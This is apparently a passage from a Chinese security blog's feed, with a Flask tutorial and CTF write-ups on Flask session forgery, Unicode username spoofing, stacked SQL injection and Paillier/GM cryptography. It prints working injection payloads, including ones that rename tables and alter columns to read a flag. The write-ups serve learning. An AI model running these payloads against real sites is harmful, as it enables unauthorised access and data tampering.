class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>而我们的python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/hello/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_name</span><span class="params">(user)</span>:</span></span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>, name = user)</span><br></pre></td></tr></table></figure><p>那么当我们输入URL- <a href="http://localhost:5000/hello/aaa" target="_blank" rel="noopener">http://localhost:5000/hello/aaa</a> 后，浏览器将显示”Hello aaa”</p><p><strong>Jinja2</strong>模板引擎使用以下分隔符从HTML转义。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- &#123;% ... %&#125;用于语句</span><br><span class="line">- &#123;&#123; ... &#125;&#125;用于表达式可以打印到模板输出</span><br><span class="line">- &#123;# ... #&#125;用于未包含在模板输出中的注释</span><br><span class="line">- \# ... ##用于行语句</span><br></pre></td></tr></table></figure><p>举例：</p><p>html模板脚本</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  &#123;% if marks&gt;50 %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span> Your result is pass!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  &#123;% else %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Your result is fail<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  &#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/hello/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_name</span><span class="params">(score)</span>:</span></span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>, marks = score)</span><br></pre></td></tr></table></figure><h3 id="Flask-静态文件"><a href="#Flask-静态文件" class="headerlink" title="Flask 静态文件"></a>Flask 静态文件</h3><p>Web应用程序通常需要静态文件，例如<strong>javascript</strong>文件或支持网页显示的<strong>CSS</strong>文件。通常，配置Web服务器并为您提供这些服务，但在开发过程中，这些文件是从您的包或模块旁边的<em>static</em>文件夹中提供，它将在应用程序的<strong>/static</strong>中提供（static文件夹与python代码位于同一目录下）。 </p><p>在下面的示例中，在<strong>index.html</strong>中的HTML按钮的<strong>OnClick</strong>事件上调用<strong>hello.js</strong>中定义的<strong>javascript</strong>函数，该函数在Flask应用程序的<strong>“/”</strong>URL上呈现。 </p><p>python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span> = <span class="string">"text/javascript"</span> </span></span><br><span class="line"><span class="tag">         <span class="attr">src</span> = <span class="string">"&#123;&#123; url_for('static', filename = 'hello.js') &#125;&#125;"</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">   </span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"button"</span> <span class="attr">onclick</span> = <span class="string">"sayHello()"</span> <span class="attr">value</span> = <span class="string">"Say Hello"</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">   </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>hello.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHello</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   alert(<span class="string">"Hello World"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Flask-将表单数据发送到模板"><a href="#Flask-将表单数据发送到模板" class="headerlink" title="Flask 将表单数据发送到模板"></a>Flask 将表单数据发送到模板</h4><p>在以下示例中，<strong>‘/‘ URL</strong>会呈现具有表单的网页（student.html）。填入的数据会发布到触发 <strong>result()</strong>函数的<strong>‘/result’ URL</strong>。</p><p><strong>results()</strong>函数收集字典对象中的<strong>request.form</strong>中存在的表单数据，并将其发送给<strong>result.html</strong>。</p><p>python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line">app = Flask(name)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">student</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">'student.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/result',methods = ['POST', 'GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">result</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">      result = request.form</span><br><span class="line">      <span class="keyword">return</span> render_template(<span class="string">"result.html"</span>,result = result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> name == <span class="string">'main'</span>:</span><br><span class="line">   app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>student.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> = <span class="string">"http://localhost:5000/result"</span> <span class="attr">method</span> = <span class="string">"POST"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>Name <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"text"</span> <span class="attr">name</span> = <span class="string">"Name"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>Physics <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"text"</span> <span class="attr">name</span> = <span class="string">"Physics"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>Chemistry <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"text"</span> <span class="attr">name</span> = <span class="string">"chemistry"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>Maths <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> =<span class="string">"text"</span> <span class="attr">name</span> = <span class="string">"Mathematics"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"submit"</span> <span class="attr">value</span> = <span class="string">"submit"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>result.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span> = <span class="string">1</span>&gt;</span></span><br><span class="line">     &#123;% for key, value in result.items() %&#125;</span><br><span class="line"></span><br><span class="line">    <span class="symbol">&amp;lt;</span>tr<span class="symbol">&amp;gt;</span></span><br><span class="line">       <span class="symbol">&amp;lt;</span>th<span class="symbol">&amp;gt;</span> &#123;&#123; key &#125;&#125; <span class="symbol">&amp;lt;</span>/th<span class="symbol">&amp;gt;</span></span><br><span class="line">       <span class="symbol">&amp;lt;</span>td<span class="symbol">&amp;gt;</span> &#123;&#123; value &#125;&#125; <span class="symbol">&amp;lt;</span>/td<span class="symbol">&amp;gt;</span></span><br><span class="line">    <span class="symbol">&amp;lt;</span>/tr<span class="symbol">&amp;gt;</span></span><br><span class="line"></span><br><span class="line"> &#123;% endfor %&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Flask-Cookies"><a href="#Flask-Cookies" class="headerlink" title="Flask Cookies"></a>Flask Cookies</h3><p>设置cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.set_cookie(key,value[,max_age&#x3D;None,exprise&#x3D;None)]</span><br></pre></td></tr></table></figure><p>获取cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.cookies.get(key)</span><br></pre></td></tr></table></figure><p> 删除cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.delete_cookie(key)</span><br></pre></td></tr></table></figure><p>例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response, request</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route("/set_cookie")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_cookie</span><span class="params">()</span>:</span></span><br><span class="line">    resp = make_response(<span class="string">"success"</span>)</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">        设置cookie,默认有效期是临时cookie,浏览器关闭就失效</span></span><br><span class="line"><span class="string">        可以通过 max_age 设置有效期， 单位是秒</span></span><br><span class="line"><span class="string">    '''</span><span class="string">''</span></span><br><span class="line">    resp.set_cookie(<span class="string">"Itcast_1"</span>, <span class="string">"python_1"</span>)</span><br><span class="line">    resp.set_cookie(<span class="string">"Itcast_2"</span>, <span class="string">"python_2"</span>)</span><br><span class="line">    resp.set_cookie(<span class="string">"Itcast_3"</span>, <span class="string">"python_3"</span>, max_age=<span class="number">3600</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route("/get_cookie")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cookie</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">        获取cookie，通过reques.cookies的方式，</span></span><br><span class="line"><span class="string">        返回的是一个字典，可以用get的方式</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    cookie_1 = request.cookies.get(<span class="string">"Itcast_1"</span>)  <span class="comment"># 获取名字为Itcast_1对应cookie的值</span></span><br><span class="line">    <span class="keyword">return</span> cookie_1</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route("/delete_cookie")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_cookie</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">        删除cookie，通过delete_cookie()的方式，</span></span><br><span class="line"><span class="string">        里面是cookie的名字</span></span><br><span class="line"><span class="string">        这里的删除只是让cookie过期，并不是直接删除cookie</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    resp = make_response(<span class="string">"del success"</span>)</span><br><span class="line">    resp.delete_cookie(<span class="string">"Itcast1"</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>参考教程:</p><ol><li><a href="https://www.w3cschool.cn/flask/" target="_blank" rel="noopener">https://www.w3cschool.cn/flask/</a> </li></ol><p>参考文章: </p><ol><li><a href="https://www.cnblogs.com/djflask/p/10460177.html" target="_blank" rel="noopener">https://www.cnblogs.com/djflask/p/10460177.html</a> </li><li><a href="https://blog.csdn.net/wei18791957243/article/details/85172653" target="_blank" rel="noopener">https://blog.csdn.net/wei18791957243/article/details/85172653</a> </li></ol>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;h3 id=&quot;Flask-HTTP方法&quot;&gt;&lt;a href=&quot;#Flask-HTTP方法&quot; class=&quot;headerlink&quot; title=&quot;Flask HTTP方法&quot;&gt;&lt;/a&gt;Flask
        
      
    
    </summary>
    
    
    
      <category term="Flask" scheme="https://zrax-x.github.io/tags/Flask/"/>
    
  </entry>
  
  <entry>
    <title>HCTF-admin</title>
    <link href="https://zrax-x.github.io/2020/05/05/HCTF-admin/"/>
    <id>https://zrax-x.github.io/2020/05/05/HCTF-admin/</id>
    <published>2020-05-05T07:00:00.000Z</published>
    <updated>2020-05-13T08:01:01.180Z</updated>
    
    <content type="html"><![CDATA[<p>参考文献</p><ol><li><a href="https://blog.csdn.net/weixin_44677409/article/details/100733581" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44677409/article/details/100733581</a> </li><li><a href="https://www.jianshu.com/p/f92311564ad0" target="_blank" rel="noopener">https://www.jianshu.com/p/f92311564ad0</a> </li><li><a href="https://www.cnblogs.com/chrysanthemum/p/11722351.html" target="_blank" rel="noopener">https://www.cnblogs.com/chrysanthemum/p/11722351.html</a> </li></ol><p>从题目中我们可以找到github源码<a href="https://github.com/woadsl1234/hctf_flask" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask</a></p><p>这里可能需要学习一下flask框架<a href="https://www.w3cschool.cn/flask/" target="_blank" rel="noopener">w3cschool</a></p><p>三种解法</p><h3 id="flask-session-伪造"><a href="#flask-session-伪造" class="headerlink" title="flask session 伪造"></a>flask session 伪造</h3><p>flask的session是存储在客户端cookie中的，而且flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。<br> 具体参考:<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.leavesongs.com%2FPENETRATION%2Fclient-session-security.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p><p>SECRET_KEY可以在config.py中获取 —— ckj123</p><p>flask中的session的加密和解密可以在<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a> 这里获取到</p><p>对于原先的session先进行解密，修改name后再次加密，然后修改本地session即可。</p><h3 id="Unicode-欺骗"><a href="#Unicode-欺骗" class="headerlink" title="Unicode 欺骗"></a>Unicode 欺骗</h3><p>观察到函数strlower()在register以及change，login中出现了，而且是针对name的处理。</p><p>strlower实际调用的是nodeprep.prepare函数，而nodeprep是从Twisted模块导入的，在requirements.txt文件中发现<code>Twisted==10.2.0</code>，而官网最新已经到了19.7.0(2019/9)，版本差距很大，应该会存在漏洞。 可以参考<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fpaper.tuisec.win%2Fdetail%2Fa9ad1440249d95b" target="_blank" rel="noopener">https://paper.tuisec.win/detail/a9ad1440249d95b</a> </p><p>示例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ᴬᴰᴹᴵᴺ -&gt; ADMIN -&gt; admin</span><br></pre></td></tr></table></figure><h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>之后再说</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;p&gt;参考文献&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/weixin_44677409/article/details/100733581&quot; target=&quot;_blank&quot;
        
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://zrax-x.github.io/tags/CTF/"/>
    
      <category term="WEB" scheme="https://zrax-x.github.io/tags/WEB/"/>
    
      <category term="flask" scheme="https://zrax-x.github.io/tags/flask/"/>
    
      <category term="unicode欺骗" scheme="https://zrax-x.github.io/tags/unicode%E6%AC%BA%E9%AA%97/"/>
    
  </entry>
  
  <entry>
    <title>SUCTF-EasySQL</title>
    <link href="https://zrax-x.github.io/2020/04/27/SUCTF-EasySQL/"/>
    <id>https://zrax-x.github.io/2020/04/27/SUCTF-EasySQL/</id>
    <published>2020-04-27T07:00:00.000Z</published>
    <updated>2020-04-27T07:14:06.812Z</updated>
    
    <content type="html"><![CDATA[<p>堆叠注入</p><p>分析后端语句 </p><p>由于输入1有回显，0无回显，所以可能存在||的操作，也就是select 输入的数据||内置的一个列名 from 表名，进一步进行猜测即为select post进去的数据||flag from Flag(含有数据的表名，通过堆叠注入可知，需要注意的是，此时的||起到的作用是or的作用。 </p><p>解法1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure><p>此时sql语句变为<code>$select *,1||flag from Flag</code></p><p>解法2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode&#x3D;pipes_as_concat;select 1</span><br></pre></td></tr></table></figure><p>其中set sql_mode=pipes_as_concat;的作用为将||的作用由or变为拼接字符串 ，因此能将前一个字段的查询结果和后一个字段查询结果进行拼接 </p><p><img src="/2020/04/27/SUCTF-EasySQL/SUCTF-easysql.png" alt="运行截图"></p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;p&gt;堆叠注入&lt;/p&gt;
&lt;p&gt;分析后端语句 &lt;/p&gt;
&lt;p&gt;由于输入1有回显，0无回显，所以可能存在||的操作，也就是select 输入的数据||内置的一个列名 from 表名，进一步进行猜测即为select post进去的数据||flag from
        
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://zrax-x.github.io/tags/CTF/"/>
    
      <category term="WEB" scheme="https://zrax-x.github.io/tags/WEB/"/>
    
      <category term="SQL注入" scheme="https://zrax-x.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>安恒4月赛-从not_RSA了解Paillier加密算法</title>
    <link href="https://zrax-x.github.io/2020/04/27/%E5%AE%89%E6%81%924%E6%9C%88%E8%B5%9B-%E4%BB%8Enot_RSA%E4%BA%86%E8%A7%A3Paillier%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    <id>https://zrax-x.github.io/2020/04/27/%E5%AE%89%E6%81%924%E6%9C%88%E8%B5%9B-%E4%BB%8Enot_RSA%E4%BA%86%E8%A7%A3Paillier%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</id>
    <published>2020-04-27T07:00:00.000Z</published>
    <updated>2020-04-26T00:58:38.162Z</updated>
    
    <content type="html"><![CDATA[<p>首先了解一下<a href="https://blog.csdn.net/qq_26816591/article/details/82944696" target="_blank" rel="noopener">Paillier加密算法</a>，也是同态加密算法的一种</p><ol><li>选取大素数p，q （p，q相近）</li><li>n=p*q，λ = (p-1)*(q-1)</li><li>随机数g</li><li>PK=(n, g) , SK=λ</li></ol><p>加密：$C = g^{m} * r^{n}\mod n^{2}$, 其中r为随机数(1,n)</p><p>解密：$m=L(C^{λ}\mod n^{2})/L(g^{λ}\mod n^{2})\mod n$，其中L(x) = (x-1)/n</p><p>原题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime <span class="keyword">as</span> getprime ,long_to_bytes,bytes_to_long,inverse</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,p,q</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> isprime,nextprime</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">n=p*q</span><br><span class="line">g=n+<span class="number">1</span></span><br><span class="line">r=random.randint(<span class="number">1</span>,n)</span><br><span class="line"></span><br><span class="line">c=(pow(g,m,n*n)*pow(r,n,n*n))%(n*n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"c=%d"</span>%(c)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"n=%d"</span>%(n)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">c=29088911054711509252215615231015162998042579425917914434962376243477176757448053722602422672251758332052330100944900171067962180230120924963561223495629695702541446456981441239486190458125750543542379899722558637306740763104274377031599875275807723323394379557227060332005571272240560453811389162371812183549</span></span><br><span class="line"><span class="string">n=6401013954612445818165507289870580041358569258817613282142852881965884799988941535910939664068503367303343695466899335792545332690862283029809823423608093</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>解法：利用yafu分解n得到p，q</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;p&gt;首先了解一下&lt;a href=&quot;https://blog.csdn.net/qq_26816591/article/details/82944696&quot; target=&quot;_blank&quot;
        
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://zrax-x.github.io/tags/CTF/"/>
    
      <category term="密码学" scheme="https://zrax-x.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>强网杯-随便注</title>
    <link href="https://zrax-x.github.io/2020/04/25/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/"/>
    <id>https://zrax-x.github.io/2020/04/25/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/</id>
    <published>2020-04-25T07:00:00.000Z</published>
    <updated>2020-04-27T07:15:53.930Z</updated>
    
    <content type="html"><![CDATA[<p>首先判断一下有无注入：输入1’发现不回显，然后1’ #显示正常，应该是存在sql注入了 </p><p>过滤了<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p><p>尝试堆叠注入 <code>?inject=1&#39;;show databases;%23</code></p><p>查看所有的表 <code>?inject=1&#39;;show tables;%23</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;;show columns from &#96;1919810931114514&#96;;%23</span><br></pre></td></tr></table></figure><p>发现flag在这张表中</p><p>既然没过滤 alert 和 rename，那就可以把表和列改名。先把 words 改为 words1，再把数字表改为 words，然后把新的 words 表里的 flag 列改为 id ，这样就可以直接查询 flag 了 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?inject&#x3D;1&#39;;RENAME TABLE &#96;words&#96; TO &#96;words1&#96;;RENAME TABLE &#96;1919810931114514&#96; TO &#96;words&#96;;ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;%23</span><br></pre></td></tr></table></figure><p>最后<code>/?inject=1&#39; or &#39;1&#39;=&#39;1</code>获取flag</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;p&gt;首先判断一下有无注入：输入1’发现不回显，然后1’ #显示正常，应该是存在sql注入了 &lt;/p&gt;
&lt;p&gt;过滤了&lt;code&gt;return
        
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://zrax-x.github.io/tags/CTF/"/>
    
      <category term="WEB" scheme="https://zrax-x.github.io/tags/WEB/"/>
    
      <category term="SQL注入" scheme="https://zrax-x.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>2020数字中国虎符CTF之GM&amp;McEliece</title>
    <link href="https://zrax-x.github.io/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6CTF%E4%B9%8BGM&amp;McEliece/"/>
    <id>https://zrax-x.github.io/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6CTF%E4%B9%8BGM&amp;McEliece/</id>
    <published>2020-04-20T07:00:00.000Z</published>
    <updated>2020-04-20T01:34:57.953Z</updated>
    
    <content type="html"><![CDATA[<h3 id="GM"><a href="#GM" class="headerlink" title="GM"></a>GM</h3><p>根据<code>pow(q ** 2 * x, (p-1)/2, p) + pow(p ** 2 * x, (q-1)/2, q) == N - phi - 1</code>可以得出<code>pow(x, (p-1)/2, p) == -1</code>。同时<code>(pow(x, int(br + bi, 2), N) * r ** 2) % N</code>等价于$x^{br\ast2+bi}\ast r^2\mod N$, 将其记为$a$，然后我们尝试计算一下$a^{(p-1)/2}\mod p$。我们把$a$代入化简，得到$x^{br\ast2\ast(p-1)/2}\ast x^{bi\ast(p-1)/2}\ast r^{2\ast(p-1)/2}\mod p$，由于第一项和第三项的结果一定为1，因此，当$bi=1$时，整个式子的结果为-1，$bi=0$时整个式子的结果为1。据此，我们可以判断某一位是0还是1。</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 